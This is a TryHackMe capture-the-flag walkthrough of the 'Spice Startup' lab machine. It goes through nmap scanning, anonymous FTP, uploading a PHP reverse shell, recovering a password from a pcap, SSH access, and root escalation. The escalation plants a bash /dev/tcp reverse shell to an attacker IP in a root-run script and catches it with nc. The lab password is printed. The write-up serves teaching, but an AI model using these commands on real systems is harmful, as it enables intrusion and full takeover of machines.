# TryHackMe: Spice Startup Walkthrough

This document outlines a workflow conducted during the "Spice Startup" challenge on TryHackMe. The goal was to assess system vulnerabilities, gain initial access, enumerate users, and escalate privileges to root access. Below is a detailed explanation of the methodology and tools used.

---

## 1. Network Enumeration

We begin with a network scan using `nmap` to identify open ports and running services:

```bash
nmap -sV 10.10.210.195
```

### Results:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
```

Two services are detected:
- **FTP (port 21)**: vsftpd 3.0.3, potentially misconfigured to allow anonymous access.
- **SSH (port 22)**: OpenSSH 7.2p2, typically used for secure remote shell access.

---

## 2. FTP Access and Exploitation

With FTP open, we test for anonymous login:

```bash
ftp anonymous@10.10.210.195
```

When prompted for a password, simply pressing enter grants access. Once connected, we enumerate the files and directories.

### File Interaction Commands:
- **Download a file:**
  ```bash
  get FILENAME
  ```
- **Upload a file (if permissions allow):**
  ```bash
  put FILENAME
  ```

We discovered that the FTP directory has write permissions. We leverage this by uploading a PHP reverse shell:

```bash
put shell.php
```

**Tool used:** [Pentestmonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

After triggering the shell via a browser or curl, we stabilize it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Findings:
- We retrieve our first flag from a file named `recipe.txt`.

---

## 3. Network Forensics

Inside a directory named `incidents`, we find a `.pcapng` file:

```bash
cp /incidents/suspicious.pcapng /var/www/html/files/ftp
```

This command places the file in a web-accessible directory for download. We then analyze it using **Wireshark**.

### Analysis:
- Use the menu option: `Follow -> TCP Stream` on TCP packets
- Review inputs and commands visible in the stream

This reveals a password being tested for a potential user named `Lennie`.

### Credentials:
- **Username:** Lennie
- **Password:** `c4ntg3t3n0ughsp1c3`

---

## 4. SSH Access and User Flag

We use the credentials discovered in the packet capture to SSH into the target system:

```bash
ssh lennie@10.10.210.195
```

Upon successful login, we locate and read `user.txt` to collect the second flag.

---

## 5. Privilege Escalation

We continue our enumeration and discover a script: `startup_list` which is executed as root. This script runs another file: `print.sh`, to which we have write permissions.

We exploit this by editing `print.sh` to contain a reverse shell:

```bash
bash -i >& /dev/tcp/10.6.8.136/8080 0>&1
```

**Note:** Replace `10.6.8.136` with your machine’s IP address.

On our local machine, we listen for the shell with:

```bash
nc -lvnp 8080
```

Once the root process executes `print.sh`, we receive a root shell on our listener, achieving full system compromise.

---
